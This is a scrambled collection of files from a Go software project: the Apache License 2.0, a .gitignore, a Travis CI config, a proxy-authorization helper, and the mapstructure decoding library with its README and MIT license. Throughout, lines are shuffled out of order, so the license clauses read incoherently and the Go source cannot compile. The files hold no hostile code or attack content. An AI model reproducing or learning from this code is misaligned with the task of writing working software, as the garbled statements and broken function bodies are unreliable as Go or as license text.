"                           Version 2.0, January 2004"
"      copyright license to reproduce, prepare Derivative Works of,"
      origin of the Work and reproducing the content of the NOTICE file.
"   8. Limitation of Liability. In no event and under no legal theory,"
"      (c) You must retain, in the Source form of any Derivative Works"
          do not modify the License. You may add Your own attribution
"      other entities that control, are controlled by, or are under common"
"          notices within Derivative Works that You distribute, alongside"
"      transformation or translation of a Source form, including but"
          that such additional attribution notices cannot be construed
"      incurred by, or claims asserted against, such Contributor by reason"
      the brackets!)  The text should be enclosed in the appropriate
"      Licensor for the purpose of discussing and improving the Work, but"
"      (except as stated in this section) patent license to make, have made,"
   9. Accepting Warranty or Additional Liability. While redistributing
"   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION"
          include a readable copy of the attribution notices contained
   APPENDIX: How to apply the Apache License to your work.
"   Licensed under the Apache License, Version 2.0 (the ""License"")"
      file or class name and description of purpose be included on the
"      of any other Contributor, and only if You agree to indemnify,"
      and distribution as defined by Sections 1 through 9 of this document.
 and
"   5. Submission of Contributions. Unless You explicitly state otherwise,"
      Work and such Derivative Works in Source or Object form.
"      ""Licensor"" shall mean the copyright owner or entity authorized by"
"      of this License, Derivative Works shall not include works that remain"
"      direction or management of such entity, whether by contract or"
"      whether in tort (including negligence), contract, or otherwise,"
      appropriateness of using or redistributing the Work and assume any
"      ""Contribution"" shall mean any work of authorship, including"
      and conversions to other media types.
"      agreed to in writing, Licensor provides the Work (and each"
"      publicly display, publicly perform, sublicense, and distribute the"
      institute patent litigation against any entity (including a
          excluding those notices that do not pertain to any part of
      by You to the Licensor shall be under the terms and conditions of
"      represent, as a whole, an original work of authorship. For the purposes"
      or a Contribution incorporated within the Work constitutes direct
"      source, and configuration files."
   you may not use this file except in compliance with the License.
"      to the Licensor or its representatives, including but not limited to"
"      the copyright owner. For the purposes of this definition, ""submitted"""
"   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"      ""Work"" shall mean the work of authorship, whether in Source or"
      where such license applies only to those patent claims licensable
"      ""Legal Entity"" shall mean the union of the acting entity and all"
   END OF TERMS AND CONDITIONS
      (b) You must cause any modified files to carry prominent notices
"      ""License"" shall mean the terms and conditions for use, reproduction,"
"      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A"
"      Work or Derivative Works thereof in any medium, with or without"
          of the NOTICE file are for informational purposes only and
"      for use, reproduction, or distribution of Your modifications, or"
          Derivative Works a copy of this License
"          within a display generated by the Derivative Works, if and"
          as modifying the License.
          wherever such third-party notices normally appear. The contents
      (an example is provided in the Appendix below).
      unless required by applicable law (such as deliberate and grossly
   1. Definitions.
"      to that Work or Derivative Works thereof, that is intentionally"
       http://www.apache.org/licenses/LICENSE-2.0
      submitted to Licensor for inclusion in the Work by the copyright owner
"      including but not limited to software source code, documentation"
"      outstanding shares, or (iii) beneficial ownership of such entity."
      with the Work to which such Contribution(s) was submitted. If You
      the terms of any separate license agreement you may have executed
          as part of the Derivative Works
"      liable to You for damages, including any direct, indirect, special,"
      on behalf of whom a Contribution has been received by Licensor and
"      the Work or Derivative Works thereof, You may choose to offer,"
"      implied, including, without limitation, any warranties or conditions"
      of your accepting any such warranty or additional liability.
"      Object form, made available under the License, as indicated by a"
   See the License for the specific language governing permissions and
"          pertain to any part of the Derivative Works, in at least one"
                        http://www.apache.org/licenses/
      the Work and Derivative Works thereof.
   You may obtain a copy of the License at
"          distribution, then any Derivative Works that You distribute must"
      except as required for reasonable and customary use in describing the
"      Contributor provides its Contributions) on an ""AS IS"" BASIS,"
      identification within third-party archives.
      You may add Your own copyright statement to Your modifications and
"      (d) If the Work includes a ""NOTICE"" text file as part of its"
          of the following places: within a NOTICE text file distributed
                 Apache License
"      control with that entity. For the purposes of this definition,"
"      Work (including but not limited to damages for loss of goodwill,"
"      ""control"" means (i) the power, direct or indirect, to cause the"
      has been advised of the possibility of such damages.
      copyright notice that is included in or attached to the work
"      this License, each Contributor hereby grants to You a perpetual,"
      by such Contributor that are necessarily infringed by their
"          within such NOTICE file, excluding those notices that do not"
      the conditions stated in this License.
   6. Trademarks. This License does not grant permission to use the trade
"      work stoppage, computer failure or malfunction, or any and all"
"      and charge a fee for, acceptance of support, warranty, indemnity,"
"      on Your own behalf and on Your sole responsibility, not on behalf"
"      ""Derivative Works"" shall mean any work, whether in Source or Object"
"   distributed under the License is distributed on an ""AS IS"" BASIS,"
"      otherwise, or (ii) ownership of fifty percent (50%) or more of the"
"      other commercial damages or losses), even if such Contributor"
"      modifications, and in Source or Object form, provided that You"
   7. Disclaimer of Warranty. Unless required by applicable law or
"      this License, without any additional terms or conditions."
"   Unless required by applicable law or agreed to in writing, software"
"      editorial revisions, annotations, elaborations, or other modifications"
"      ""Source"" form shall mean the preferred form for making modifications,"
      any Contribution intentionally submitted for inclusion in the Work
      risks associated with Your exercise of permissions under this License.
"      not limited to compiled object code, generated documentation,"
      result of this License or out of the use or inability to use the
"      defend, and hold each Contributor harmless for any liability"
      the copyright owner that is granting the License.
          stating that You changed the files
"          attribution notices from the Source form of the Work,"
"      and issue tracking systems that are managed by, or on behalf of, the"
      granted to You under this License for that Work shall terminate
" or,"
"      License. However, in accepting such obligations, You may act only"
      the original version of the Work and any modifications or additions
      replaced with your own identifying information. (Don't include
   3. Grant of Patent License. Subject to the terms and conditions of
"      worldwide, non-exclusive, no-charge, royalty-free, irrevocable"
"      negligent acts) or agreed to in writing, shall any Contributor be"
   Copyright [yyyy] [name of copyright owner]
"      ""Object"" form shall mean any form resulting from mechanical"
      PARTICULAR PURPOSE. You are solely responsible for determining the
   limitations under the License.
      exercising permissions granted by this License.
"      use, offer to sell, sell, import, and otherwise transfer the Work,"
"      boilerplate notice, with the fields enclosed by brackets ""[]"""
"      Notwithstanding the above, nothing herein shall supersede or modify"
"      form, that is based on (or derived from) the Work and for which the"
"      separable from, or merely link (or bind by name) to the interfaces of,"
[568vq].out
 cache files for sublime text
.idea/dataSources.ids
/out/
 Build generated
 TeXlipse plugin
 Eclipse Core
 Recycle Bin used on file shares
 PyDev specific (Python IDE for Eclipse)
 Xcode
.stTheme.cache
.[568vq]
 JIRA plugin
.cgo1.go
DerivedData/
.idea/dictionaries
.mode1v3
.metadata
 mpeltonen/sbt-idea plugin
.cab
.loadpath
 temporary files which can be created if a process still has a handle open of a deleted file
.idea/sqlDataSources.xml
.project
.swp
.iws
atlassian-ide-plugin.xml
Desktop.ini
fabric.properties
.tmp
 Reference: https://intellij-support.jetbrains.com/hc/en-us/articles/206544839
.test
!default.pbxuser
build/
.idea/dataSources.xml
.msi
 Windows shortcuts
 Linux trash folder which might appear on any partition or disk
 Windows Installer files
.exe
.msm
.idea/uiDesigner.xml
 Java annotation processor (APT)
.nib
" Locally stored ""Eclipse launch configurations"""
_cgo_defun.c
.msp
.pbxuser
.sublime-workspace
.sublime-project
.swp.
.moved-aside
 Various settings
.classpath
.directory
" gitignore contributors: remember to update Global/Xcode.gitignore, Objective-C.gitignore "
.recommenders/
.perspectivev3
 Go template
.externalToolBuilders/
.settings/
.tmlanguage.cache
 Mongo Explorer plugin:
.idea
ehthumbs.db
.pydevproject
Thumbs.db
 sbteclipse plugin
 sftp configuration file
.idea/jsLibraryMappings.xml
.texlipse
.kate-swp
 File-based project format:
_test
.target
 STS (Spring Tool Suite)
.idea/vcs.xml
sftp-config.json
.buildpath
local.properties
.Trash-
crashlytics.properties
.cgo2.c
 Windows template
.idea/tasks.xml
" project files should be checked into the repository, unless a significant"
$RECYCLE.BIN/
.mode2v3
.lnk
 JetBrains template
 Swift.gitignore
 Folder config file
" Compiled Object files, Static and Dynamic libs (Shared Objects)"
 SublimeText template
 Swap Files 
 Tern plugin
.cproject
 Plugin-specific files:
" Covers JetBrains IDEs: IntelliJ, RubyMine, PhpStorm, AppCode, PyCharm, CLion, Android Studio and Webstorm"
 Sensitive or high-churn files:
.idea/libraries
 Other
 Architecture specific extensions/prefixes
.xcscmblueprint
 PDT-specific (PHP Development Tools)
_cgo_export.
 External tool builders
.prof
 IntelliJ
.launch
.springBeans
 Eclipse template
 Windows image file caches
!default.mode2v3
 Linux template
.idea/mongoSettings.xml
.tern-project
.idea/gradle.xml
 User-specific stuff:
 Gradle:
 KDE directory preferences
.recommenders
tmp/
com_crashlytics_export_strings.xml
!default.mode1v3
_cgo_gotypes.go
 Created by .ignore support plugin (hsz.mobi)
 Development Tooling)
.idea/dynamic.xml
crashlytics-build.properties
 workspace files are user-specific
.xccheckout
xcuserdata/
 proportion of contributors will probably not be using SublimeText
!default.perspectivev3
 CDT-specific (C/C
 Kate template
.bak
.tmPreferences.cache
 Code Recommenders
 JDT-specific (Eclipse Java Development Tools)
 Crashlytics plugin (for Android Studio and IntelliJ)
_obj
.idea/dataSources.local.xml
.fuse_hidden
_testmain.go
bin/
.idea_modules/
 Folders
.factorypath
 Xcode template
  - 1.7
 - go test -race -v ./...
script:
language: go
sudo: false
  - go get google.golang.org/grpc
  - go get golang.org/x/net/context
install:
  - go get github.com/elazarl/goproxy
  - go get github.com/stretchr/testify
package http_dialer
"// Type represents what kind of Authorization, e.g. ""Bearer"", ""Token"", ""Digest""."
// TODO(mwitkow): Implement realm lookup in AuthBasicWithRealm.
"// ChallengeResponse returns the content of the ""Proxy-Authenticate"" response header, that has been chose as"
"// so you don't need to wait for an additional challenge. If empty string is returned, ""Proxy-Authenticate"""
"// AuthBasic returns a ProxyAuthorization that implements ""Basic"" protocol while ignoring realm challanges."
basicAuth) authString() string {
resp := b.username 
" "":"" "
"import ""encoding/base64"""
basicAuth) Type() string {
"hdrProxyAuthResp = ""Proxy-Authorization"""
password string
"// Initial allows you to specify an a-priori ""Proxy-Authenticate"" response header, attached to first request,"
InitialResponse() string
username string
"func AuthBasic(username string, password string) ProxyAuthorization {"
return base64.StdEncoding.EncodeToString([]byte(resp))
"basicAuth{username: username, password: password}"
// See LICENSE for licensing terms.
// Copyright 2016 Michal Witkowski. All Rights Reserved.
"// ProxyAuthorization allows for plugging in arbitrary implementations of the ""Proxy-Authorization"" handler."
type basicAuth struct {
func (b 
// header is added.
"// challenge can be realm=""proxy.com"""
basicAuth) InitialResponse() string {
basicAuth) ChallengeResponse(challenge string) string {
return b.authString()
 b.password
"return ""Basic"""
Type() string
"hdrProxyAuthReq = ""Proxy-Authenticate"""
"// response to ""Proxy-Authorization"" request header challenge."
ChallengeResponse(challenge string) string
return 
type ProxyAuthorization interface {
const (
Errors []string
"""fmt"""
" %s"", err)"
"for i, e := range e.Errors {"
import (
// WrappedErrors implements the errwrap.Wrapper interface to make this
"return append(errors, e.Errors...)"
type Error struct {
"func appendErrors(errors []string, err error) []string {"
default:
package mapstructure
"n""))"
Error:
"result := make([]error, len(e.Errors))"
return result
func (e 
return nil
// return value more useful with the errwrap and go-multierror libraries.
sort.Strings(points)
"points[i] = fmt.Sprintf("""
"for i, err := range e.Errors {"
"return append(errors, e.Error())"
"points := make([]string, len(e.Errors))"
return fmt.Sprintf(
result[i] = errors.New(e)
Error) Error() string {
"len(e.Errors), strings.Join(points, """
"""sort"""
// Error implements the error interface and can represents multiple
"""errors"""
if e == nil {
switch e := err.(type) {
case 
Error) WrappedErrors() []error {
"""strings"""
"""%d error(s) decoding:"
"n%s"","
// errors that occur in the course of a single decode.
status.svg)](https://godoc.org/github.com/mitchellh/mapstructure)
For usage and examples see the [Godoc](http://godoc.org/github.com/mitchellh/mapstructure).
"The standard method is to have a struct pre-created, and populate that struct"
map[string]interface{}
 mapstructure [![Godoc](https://godoc.org/github.com/mitchellh/mapstructure
"the ""type"" field from the JSON. We could always do two passes over the"
"decoding of the JSON (reading the ""type"" first, and the rest later)."
"structure, read the ""type"" key, then use something like this library"
and use this library to decode it into the proper underlying native Go
 Usage 
"specific fields. For example, consider this JSON:"
 Installation
 Example
to decode it into the proper structure.
$ go get github.com/mitchellh/mapstructure
 function has examples associated with it there.
Go offers fantastic standard libraries for decoding formats such as JSON.
"and vice versa, while providing helpful error handling."
json
you have configuration or an encoding that changes slightly depending on
Perhaps we can't populate a specific structure without first reading
"  ""type"": ""person"","
go get
"from the bytes of the encoded format. This is great, but the problem is if"
structure.
 But Why
"However, it is much simpler to just decode this into a "
"This library is most useful when decoding values from some data stream (JSON,"
"  ""name"": ""Mitchell"""
Decode
Standard 
The 
"Gob, etc.) where you don't _quite_ know the structure of the underlying data"
until you read a part of it. You can therefore read a 
mapstructure is a Go library for decoding generic map values to structures
"_, net, err := net.ParseCIDR(data.(string))"
// ComposeDecodeHookFunc creates a single DecodeHookFunc that
case DecodeHookFuncType:
// the decoder.
return func(
"for _, raw := range potential {"
 t != reflect.Slice {
return time.ParseDuration(data.(string))
var err error
case reflect.Uint:
default:
if f.Kind() != reflect.String {
"return []string{}, nil"
"return strconv.FormatInt(dataVal.Int(), 10), nil"
func typedDecodeHook(h DecodeHookFunc) DecodeHookFunc {
return nil
f = val.Type()
"raw DecodeHookFunc,"
"return f(from.Kind(), to.Kind(), data)"
// WeaklyTypedHook is a DecodeHookFunc which adds support for weak typing to
dataType := dataVal.Type()
"f reflect.Type,"
if f != reflect.String 
func StringToTimeHookFunc(layout string) DecodeHookFunc {
// Fill in the variables into this interface and the rest is done
"""strconv"""
"""errors"""
func StringToTimeDurationHookFunc() DecodeHookFunc {
"""strings"""
"return string(dataVal.Interface().([]uint8)), nil"
"for _, f1 := range fs {"
"return strconv.FormatFloat(dataVal.Float(), 'f', -1, 64), nil"
 val.IsValid() {
"potential := []interface{}{f1, f2}"
// StringToTimeHookFunc returns a DecodeHookFunc that converts
if elemKind == reflect.Uint8 {
var f1 DecodeHookFuncType
"data, err = DecodeHookExec(f1, f, t, data)"
func StringToIPHookFunc() DecodeHookFunc {
"return f(from, to, data)"
"return data, nil"
// Modify the from kind to be correct with the new data
var f2 DecodeHookFuncKind
if t != reflect.TypeOf(net.IP{}) {
func ComposeDecodeHookFunc(fs ...DecodeHookFunc) DecodeHookFunc {
func StringToSliceHookFunc(sep string) DecodeHookFunc {
case reflect.Float32:
// StringToIPNetHookFunc returns a DecodeHookFunc that converts
if t != reflect.TypeOf(time.Duration(5)) {
func StringToIPNetHookFunc() DecodeHookFunc {
if t != reflect.TypeOf(time.Time{}) {
case reflect.Slice:
vt := v.Type()
if val := reflect.ValueOf(data)
// automatically using the reflect package.
// DecodeHookExec executes the given decode hook. This should be used
if err != nil {
f = nil
func WeaklyTypedHook(
"return ""1"", nil"
"""fmt"""
// Create variables here so we can reference them with the reflect pkg
// strings to net.IP
"return time.Parse(layout, data.(string))"
"return net.IP{}, fmt.Errorf(""failed parsing ip %v"", data)"
import (
"return strings.Split(raw, sep), nil"
// StringToSliceHookFunc returns a DecodeHookFunc that converts
switch f := typedDecodeHook(raw).(type) {
dataVal := reflect.ValueOf(data)
"return ""0"", nil"
"""reflect"""
// of the DecoderConfig.
package mapstructure
// string to []string by splitting on the given sep.
"""net"""
// Note that this is significantly different from the WeaklyTypedInput option
return v.Convert(pt).Interface()
case reflect.Int:
"from reflect.Type, to reflect.Type,"
switch t {
// previous transformation.
// strings to net.IPNet
ip := net.ParseIP(data.(string))
"data interface{}) (interface{}, error) {"
"""time"""
"return ip, nil"
raw := data.(string)
// since it'll naturally degrade to the older backwards compatible DecodeHookFunc
"return nil, err"
// that took reflect.Kind instead of reflect.Type.
"f reflect.Kind,"
case DecodeHookFuncKind:
"t reflect.Type,"
case reflect.Bool:
case reflect.String:
switch f {
// typedDecodeHook takes a raw DecodeHookFunc (an interface{}) and turns
pt := reflect.ValueOf(raw).Type()
"if raw == """" {"
if vt.ConvertibleTo(pt) {
// strings to time.Duration.
// StringToTimeDurationHookFunc returns a DecodeHookFunc that converts
"return strconv.FormatUint(dataVal.Uint(), 10), nil"
// automatically composes multiple DecodeHookFuncs.
"t reflect.Kind,"
// StringToIPHookFunc returns a DecodeHookFunc that converts
if t != reflect.TypeOf(net.IPNet{}) {
"// it into the proper DecodeHookFunc type, such as DecodeHookFuncType."
// strings to time.Time.
if ip == nil {
"// The composed funcs are called in order, with the result of the"
elemKind := dataType.Elem().Kind()
v := reflect.ValueOf(h)
func DecodeHookExec(
if dataVal.Bool() {
"return net, err"
// Convert it by parsing
"return nil, errors.New(""invalid decode hook signature"")"
"of this software and associated documentation files (the ""Software""), to deal"
The above copyright notice and this permission notice shall be included in
"copies of the Software, and to permit persons to whom the Software is"
"furnished to do so, subject to the following conditions:"
THE SOFTWARE.
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
The MIT License (MIT)
Copyright (c) 2013 Mitchell Hashimoto
all copies or substantial portions of the Software.
"in the Software without restriction, including without limitation the rights"
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
"Permission is hereby granted, free of charge, to any person obtaining a copy"
 dataValKind != reflect.Slice {
// A Decoder takes a raw interface value and turns it into structured
if dataVal.Kind() == reflect.Ptr 
dataVal = reflect.Zero(val.Type())
"// data transformations. See ""DecodeHook"" in the DecoderConfig"
// error.
val.SetBool(false)
"return fmt.Errorf(""cannot parse '%s' as float: %s"", name, err)"
//   - strings to int/uint (base implied by prefix)
if val.Type() != dataVal.Type() {
// Next get the actual value of this field and verify it is assignable
Error{errors}
"Metadata:         metadata,"
structType := structVal.Type()
"if err := d.decode(fieldName, currentData, currentField)"
case reflect.Uint:
var uints []uint8
squash := false
default:
"} else if dataVal.String() == """" {"
"Decoder) decodeInt(name string, data interface{}, val reflect.Value) error {"
case dataKind == reflect.Bool 
case dataValKind == reflect.Map:
valKeyType := valType.Key()
dataValKeysUnused[dataValKey.Interface()] = struct{}{}
"reflect.Interface,"
"if err := d.decodeMapFromStruct(name, dataVal, mval, mval)"
"Decoder) decodeBool(name string, data interface{}, val reflect.Value) error {"
// enable both WeaklyTypedInput and metadata collection. See
if !isNil {
WeaklyTypedInput bool
"arrayType := reflect.ArrayOf(valType.Len(), valElemType)"
"case reflect.Array, reflect.Slice:"
" name != """" {"
"valMap.SetMapIndex(k, vMap.MapIndex(k))"
// Decode takes an input structure and uses reflection to translate it to
// enable metadata collection. See DecoderConfig for more info.
"""errors"""
"//   - string to bool (accepts: 1, t, T, TRUE, true, True, 0, f, F,"
"for _, k := range vMap.MapKeys() {"
val = val.Elem()
case dataKind == reflect.Uint 
case reflect.Interface:
 !d.config.WeaklyTypedInput {
for rawKey := range dataValKeysUnused {
 valElemType.Kind() == reflect.Uint8:
"Decoder) decodeFloat(name string, data interface{}, val reflect.Value) error {"
structVal := structs[0]
// Create slice of maps of other sizes
"fieldName := fmt.Sprintf(""%s[%s]"", name, k)"
switch outputKind {
// WeakDecode is the same as Decode but is shorthand to enable
"i, err := jn.Float64()"
"func DecodeMetadata(input interface{}, output interface{}, metadata "
tagValue := field.Tag.Get(d.config.TagName)
"// value to ""data"" of that type."
"Decoder) decodePtr(name string, data interface{}, val reflect.Value) error {"
 i < typ.NumField()
"// If the input data is empty, then we just match what the input data is."
currentField := valSlice.Index(i)
"if strings.EqualFold(mK, fieldName) {"
"type DecodeHookFuncKind func(reflect.Kind, reflect.Kind, interface{}) (interface{}, error)"
// and we just continue onwards.
Decoder) Decode(input interface{}) error {
case reflect.Float32:
"Decoder) decode(name string, input interface{}, outVal reflect.Value) error {"
DecoderConfig) (
"WeaklyTypedInput: true,"
// Empty maps turn into empty arrays
} else {
"err := fmt.Errorf(""'%s' has invalid keys: %s"", name, strings.Join(keys, "", ""))"
outVal.Set(reflect.Zero(outVal.Type()))
"for _, f := range fields {"
"name, i)"
"for _, tag := range tagParts[1:] {"
string to string
break
val.SetUint(i)
rawMapVal = dataVal.MapIndex(dataValKey)
// Set the built up map to the value
if dataKind == reflect.Array {
val.SetFloat(f)
if valMap.IsNil() 
// struct.
"// for fieldType, field := range fields {"
type DecodeHookFunc interface{}
// keys in the original map that were unused in the decoding process
// All other types we try to convert to the slice type
"// If the map is nil or we're purposely zeroing fields, make a new map"
Unused []string
// DecoderConfig for more info.
"structs = append(structs, structVal.FieldByName(fieldType.Name))"
"config.TagName = ""mapstructure"""
// DecodeHookFuncKind is a DecodeHookFunc which knows only the Kinds of the
//   - numbers to string (base 10)
case dataKind == reflect.Float32:
if !rawMapVal.IsValid() {
val.SetFloat(dataVal.Float())
fieldKind := fieldType.Type.Kind()
case reflect.Func:
return reflect.Int
"inputVal.Type(), outVal.Type(), input)"
"for _, dataValKey := range dataVal.MapKeys() {"
case dataKind == reflect.Slice 
"name, val.Type(), dataVal.Type())"
"err = d.decodeSlice(name, input, outVal)"
rawMapVal := dataVal.MapIndex(rawMapKey)
if config.Metadata != nil {
"val.SetString(strconv.FormatUint(dataVal.Uint(), 10))"
if dataVal.Len() == 0 {
"err = d.decodePtr(name, input, outVal)"
result := 
fallthrough
if !val.IsNil() 
val.SetUint(1)
vMap := reflect.MakeMap(mType)
"errors = appendErrors(errors,"
Result interface{}
// NewDecoder returns a new decoder for the given configuration. Once
case reflect.Bool:
"keys = append(keys, rawKey.(string))"
// Determine the name of the key in the map
"errors := make([]string, 0)"
" d.config.WeaklyTypedInput,"
val.SetUint(uint64(i))
Metadata
val.Set(valMap)
 val.CanSet() {
"// of that exact pointer, then indirect it so that we can assign it."
dataVal := reflect.Indirect(reflect.ValueOf(data))
// WeaklyTypedInput. See DecoderConfig for more info.
"err = d.decodeArray(name, input, outVal)"
"// If ""squash"" is specified in the tag, we squash the field down."
"if tagParts[0] == ""-"" {"
// The reason DecodeHookFunc is multi-typed is for backwards compatibility:
 kind <= reflect.Uint64:
if squash {
// the struct. Just ignore.
"tagParts := strings.Split(fieldType.Tag.Get(d.config.TagName), "","")"
"err = d.decodeUint(name, input, outVal)"
if dataVal.Type() == val.Type() {
"// If an error is returned, the entire decode will fail with that"
"config.Metadata.Keys = make([]string, 0)"
// that are squashed.
if d.config.ZeroFields {
// source and target types.
"errors = appendErrors(errors, err)"
for i := range uints {
"// it. If this is false, a map will be merged."
// again.
if err == nil {
mval := reflect.Indirect(reflect.ValueOf(
// Decode decodes the given raw interface to the target pointer specified
"f, err := strconv.ParseFloat(dataVal.String(), val.Type().Bits())"
"fieldName := fmt.Sprintf(""%s[%d]"", name, i)"
case dataKind == reflect.Int:
"Decoder) decodeFunc(name string, data interface{}, val reflect.Value) error {"
for len(structs) > 0 {
dataValKeys := make(map[reflect.Value]struct{})
currentField := valArray.Index(i)
//   - negative numbers to overflowed uint values (base 10)
return reflect.Uint
keyName := f.Name
if !val.CanAddr() {
val.SetFloat(float64(dataVal.Uint()))
currentKey := reflect.Indirect(reflect.New(valKeyType))
"if tagParts[0] != """" {"
"// This decodes a basic type (bool, int, string, etc.) and sets the"
"dataVal.Index(i).Interface(), val)"
// more finely control how the Decoder behaves using the DecoderConfig
"val.SetString(""1"")"
// Create an element of the concrete (non pointer) type and decode
"""'%s' expected type '%s', got '%s'"","
"""strconv"""
// then we just set it directly instead of recursing into the structure.
"err = d.decodeBool(name, input, outVal)"
"mapType := reflect.MapOf(valKeyType, valElemType)"
"func WeakDecodeMetadata(input interface{}, output interface{}, metadata "
v := dataVal.Field(i)
"if config.TagName == """" {"
"""strings"""
 kind <= reflect.Int64:
return fmt.Errorf(
// and allows customization of various aspects of decoding.
"// other structs, etc. and the decoder will properly decode nested"
// Special case for BC reasons (covered by tests)
"val.SetString(""0"")"
//   - slice of maps to a merged map
switch v := reflect.Indirect(reflect.ValueOf(data))
"// field is unexported, then ignore it."
// If we reached this point then we weren't able to decode it
if realVal.IsNil() 
// Not a string key
"structs := make([]reflect.Value, 1, 5)"
"if tagValue != """" {"
val.Set(reflect.Zero(arrayType))
"Decoder, error) {"
case reflect.Ptr:
"tagParts := strings.Split(tagValue, "","")"
"key = fmt.Sprintf(""%s.%s"", name, key)"
// Just re-try this function with data as a slice.
// DecoderConfig is the configuration that is used to create a new decoder
dataValType := dataVal.Type()
val.SetInt(dataVal.Int())
jn := data.(json.Number)
sort.Strings(keys)
// Either is accepted. Types are a superset of Kinds (Types can return
"err := d.decode(keyName, x.Interface(), vMap)"
"err = d.decodeString(name, input, outVal)"
if input != nil {
if isNil {
"Decoder) decodeStruct(name string, data interface{}, val reflect.Value) error {"
"val.SetString(strconv.FormatInt(dataVal.Int(), 10))"
fieldName = tagValue
 val.Elem().IsValid() {
 d.config.WeaklyTypedInput:
"""'%s' needs a map with string keys, has '%s' keys"","
dataValKind := dataVal.Kind()
"// ""weak"" conversions:"
case reflect.Slice:
if !val.IsNil() {
tagValue := f.Tag.Get(d.config.TagName)
// both.
if !fieldValue.IsValid() {
// mark the key as used if we're tracking metainput.
"fieldName = fmt.Sprintf(""%s.%s"", name, fieldName)"
if err != nil {
config := 
// structure. The top-level Decode method is just a convenience that sets
"//     FALSE, false, False. Anything else is an error)"
"Metadata: nil,"
// to the map value.
"""fmt"""
"// If we reached here, then we successfully decoded SOMETHING, so"
switch elemKind {
"Decoder) decodeMapFromStruct(name string, dataVal reflect.Value, val reflect.Value, valMap reflect.Value) error {"
// weren't decoded since there was no matching field in the result interface
field reflect.StructField
dataVal := reflect.ValueOf(data)
if f < 0 
"return fmt.Errorf(""'%s' expected a map, got '%s'"", name, dataVal.Kind())"
// Metadata is the struct that will contain extra metadata about
"""reflect"""
"case dataValKind == reflect.Slice, dataValKind == reflect.Array:"
dataKind == reflect.Array 
"// Make a new slice to hold our result, same size as the original data."
package mapstructure
"delete(dataValKeysUnused, rawMapKey.Interface())"
"if name != """" {"
"func Decode(input interface{}, output interface{}) error {"
vType := valMap.Type()
"fmt.Errorf(""%s: unsupported type for squash: %s"", fieldType.Name, fieldKind))"
"d.config.Metadata.Keys = append(d.config.Metadata.Keys, name)"
"//     element is weakly decoded. For example: ""4"" can become []int{4}"
// we want to. To convert from struct to struct we go to map first
fieldName := field.Name
val.SetFloat(i)
valElemType := valType.Elem()
"// If the input value is empty, then don't allocate since non-nil != nil"
"// If there were errors, we return those"
// maps and so on into the proper structures in the native Go struct.
func (d 
case dataValKind == reflect.String 
"Metadata: metadata,"
// Slice and array we use the normal logic
"name, dataValType.Key().Kind())"
"Decoder) decodeBasic(name string, data interface{}, val reflect.Value) error {"
"if err := d.decode(name, data, reflect.Indirect(realVal))"
//   - int to bool (true if value != 0)
return 
// Add the unused keys to the list of unused keys if we're tracking metadata
// don't dot-join the fields.
TagName string
if inputVal.Kind() == reflect.Ptr 
typ := dataVal.Type()
val.SetInt(0)
val.SetUint(0)
"""'%s': expected source data to have length less or equal to %d, got %d"", name, arrayType.Len(), dataVal.Len())"
"err = d.decodeStruct(name, input, outVal)"
"// defaults to ""mapstructure"""
val.Set(dataVal)
case reflect.String:
val.SetBool(dataVal.Uint() != 0)
if valArray.Interface() == reflect.Zero(valArray.Type()).Interface() 
return kind
val.SetFloat(0)
if d.config.ErrorUnused 
case kind >= reflect.Uint 
if i < 0 
// if you only need those.
"// If the input data is nil, then we want to just set the output"
reflect.Slice:
"return nil, errors.New(""result must be addressable (a pointer)"")"
if len(errors) > 0 {
case dataKind == reflect.Uint:
val.SetString(dataVal.String())
"return fmt.Errorf(""cannot parse '%s', %f overflows uint"","
// DecodeHookFunc is the callback function that can be used for
type Decoder struct {
var inputVal reflect.Value
// There can be more than one struct if there are embedded structs
x := reflect.New(v.Type())
type Metadata struct {
"err = d.decodeFunc(name, input, outVal)"
"""sort"""
// from all the structs.
"return fmt.Errorf(""error decoding '%s': %s"", name, err)"
elemKind := dataType.Elem().Kind()
dataValKeys[dataValKey] = struct{}{}
// This slice will keep track of all the structs we'll be decoding.
"name, val.Type(), dataValType)"
// pointer to be nil as well.
// Unused is a slice of keys that were found in the raw value but
// map[string]interface{} into a native Go structure.
"// The Go structure can be arbitrarily complex, containing slices,"
"// For example, a map will be emptied before decoded values are put in"
case dataKind == reflect.String:
val.SetInt(1)
if config.Metadata.Keys == nil {
valArray := val
if dataValKind != reflect.Array 
"// Kinds) and are generally a richer thing to use, but Kinds are simpler"
realVal = reflect.New(valElemType)
"// Finally, set the value to the slice we built up"
 len(dataValKeysUnused) > 0 {
realVal := val
// Check input type and based on the input type jump to the proper func
"valSlice = reflect.MakeSlice(sliceType, dataVal.Len(), dataVal.Len())"
var err error
"return d.decodeMapFromMap(name, dataVal, val, valMap)"
// Next decode the data into the proper type
dataVal = reflect.Indirect(dataVal)
"// If ErrorUnused is true, then it is an error for there to exist"
"name, f)"
uints = dataVal.Interface().([]uint8)
if !ok {
// Result is a pointer to the struct that will contain the decoded
"// anything goes wrong. Unlike the basic top-level Decode method, you can"
// value.
"b, err := strconv.ParseBool(dataVal.String())"
vKeyType := vType.Key()
"reflect.Map,"
"valMap.SetMapIndex(reflect.ValueOf(keyName), vMap)"
// By default we overwrite keys in the current map
"val.Set(reflect.MakeSlice(sliceType, 0, 0))"
// We need to check here if input is a typed nil. Typed nils won't
if !fieldValue.CanSet() {
case kind >= reflect.Float32 
// the values before they're set down onto the resulting struct.
// but have a promise to not break backwards compat so we now support
// the output structure. output must be a pointer to a map or struct.
"""'%s': source data must be an array or slice, got %s"", name, dataValKind)"
//     if the target type is an int slice.
// Not the most efficient way to do this but we can optimize later if
Keys []string
isNil := data == nil
"input, err = DecodeHookExec("
squash = true
// All other types we try to convert to the array type
// Do a slower search by iterating over each key and
if val.IsValid() 
